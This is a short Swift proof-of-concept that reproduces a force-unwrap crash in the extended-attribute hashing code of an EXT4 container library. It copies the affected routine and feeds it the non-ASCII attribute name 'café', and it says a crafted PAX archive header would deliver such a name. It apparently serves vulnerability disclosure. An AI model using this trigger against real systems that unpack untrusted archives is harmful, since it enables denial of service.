// poc_reproduce.swift — minimal reproducer for CWE-476 in ContainerizationEXT4
// Extracted from: Sources/ContainerizationEXT4/EXT4+Xattrs.swift (line 57-79)
// Demonstrates: char.asciiValue! force-unwrap crash on non-ASCII xattr name

import Foundation

// --- Verbatim excerpt from EXT4+Xattrs.swift ---
struct ExtendedAttributeRepr {
    let name: String
    let value: [UInt8]

    var hash: UInt32 {
        var hash: UInt32 = 0
        for char in name {
            // LINE 60 — THE VULNERABLE LINE:
            hash = (hash << 5) ^ (hash >> 27) ^ UInt32(char.asciiValue!)
        }
        var i = 0
        while i + 3 < value.count {
            let s = value[i..<i + 4]
            let v = s.withUnsafeBytes { $0.load(as: UInt32.self) }
            hash = (hash << 16) ^ (hash >> 16) ^ v
            i += 4
        }
        return hash
    }

    init(name: String, value: [UInt8]) {
        self.name = name
        self.value = value
    }
}
// --- End excerpt ---

// Attack: PAX xattr header with non-ASCII name user.café
// After prefix compression (index=1 maps "user."), compressedName = "café"
let xattrCompressedName = "café"           // é = U+00E9, has no ASCII value
let xattrValue = Array(repeating: UInt8(0x41), count: 92) // 92 bytes → forces block storage

print("[+] Reproducing EXT4+Xattrs.swift line 60 crash: char.asciiValue! on non-ASCII char")
print("[+] xattr name (compressed): \(xattrCompressedName.debugDescription)")
print("[+] value size: \(xattrValue.count) bytes")
print("[+] Calling .hash on ExtendedAttributeRepr...")

let attr = ExtendedAttributeRepr(name: xattrCompressedName, value: xattrValue)
let h = attr.hash  // <-- CRASH: Fatal error: Unexpectedly found nil while unwrapping an Optional value
print("[-] hash (should never reach here): \(h)")
